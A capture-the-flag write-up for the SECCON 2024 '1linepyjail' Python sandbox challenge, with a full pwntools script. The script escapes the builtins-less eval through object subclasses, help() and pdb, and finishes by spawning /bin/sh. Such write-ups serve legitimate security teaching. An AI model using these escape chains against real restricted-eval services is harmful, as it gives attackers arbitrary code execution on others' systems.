## SECCON 2024 Quals 1linepyjail

Official archive: <https://github.com/SECCON/SECCON13_online_CTF/blob/main/jail/1linepyjail/README.md>

```python
print(eval(code, {"__builtins__": None}, {}) if len(code := input("jail> ")) <= 100 and __import__("re").fullmatch(r'([^()]|\(\))*', code) else ":(")
```

Requirements:

1. Length <= 100: Try hard to reduce input length
2. Allow `()` but no parameters: Use `sys.modules["pdb"].set_trace()`
3. No builtins: Use `().__class__.__base__.__subclasses__()` to find `sys`

Steps:

1. Locate `<class '_sitebuiltins._Helper'>` and `<class '_sitebuiltins._Printer'>` in `().__class__.__base__.__subclasses__()`
2. Call `help()` via `<class '_sitebuiltins._Helper'>` and load `pdb` module in help() system
3. Locate `sys` module via `<class '_sitebuiltins._Printer'>.__init__.__globals__` and execute `sys.modules['pdb'].set_trace()`

Attack script:

```python
from pwn import *

context(log_level="debug")

# step 1. locate Helper and Printer
p = process(["python3", "jail.py"])
p.recvuntil(b"jail>")
p.sendline("().__class__.__base__.__subclasses__()".encode())
res = p.recvline().decode()

helper_index = res.split(", ").index("<class '_sitebuiltins._Helper'>")
printer_index = res.split(", ").index("<class '_sitebuiltins._Printer'>")
print("Helper", helper_index)
print("Printer", printer_index)

# step 2. call help() to load pdb module
p = process(["python3", "jail.py"])
p.recvuntil(b"jail>")
p.sendline(
    (
        f"().__class__.__base__.__subclasses__()[{helper_index}]()()"
    ).encode()
)
# load pdb and return to jail
p.sendline(b"pdb")
p.sendline(b"jail")
p.recvuntil(b"jail>")
# step 3. locate sys module and call `sys.modules['pdb'].set_trace()`
p.sendline(
    (
        f"().__class__.__base__.__subclasses__()[{printer_index}].__init__.__globals__['sys'].modules['pdb'].set_trace()"
    ).encode()
)
# in pdb
p.recvuntil(b"(Pdb) ")
p.sendline(
    (
        f"().__class__.__base__.__subclasses__()[{printer_index}].__init__.__globals__['sys'].modules['os'].system('/bin/sh')"
    ).encode()
)
p.interactive()
```
